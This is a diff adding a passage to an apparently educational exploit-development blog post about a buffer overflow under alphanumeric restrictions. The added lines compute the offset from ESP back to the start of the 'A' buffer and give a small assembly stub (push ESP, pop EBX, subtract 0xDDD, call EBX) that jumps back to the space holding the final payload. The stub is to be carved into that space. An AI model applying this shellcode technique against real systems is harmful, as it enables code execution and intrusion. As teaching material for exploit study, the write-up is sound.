@@ -108,4 +108,22 @@ The addresses changed here because they kept changing between restarts of the pr
 
 With the extra space prepared, we're ready to carve out a bigger jump back, that will take more shellcode that couldn't have been previously fit in. I want to leverage all the space I have for the final payload, so I want to jump to the start of the "A" buffer. I'll do this by manipulating EBX and then jumping to it. I'm using EBX since EAX will be tied up with the "carving".
 
+The first "A": `0x010AFFCB`
+
+ESP: `0x010AF1EE`
+
+A difference of 0xDDD or 3549 decimal bytes.
+This is the shellcode I want to use:
+
+```nasm
+54            PUSH ESP
+5B            POP EBX
+81EBDD0D0000  SUB EBX, 0xDDD
+FFD3          CALL EBX
+```
+
+I can save myself some carving by just putting `\x54\x5B` right into the payload since they're alphanumeric-friendly. The rest will need to be carved:
+
 ![]({{site.baseurl}}/assets/images/lter/13.png)
+
+
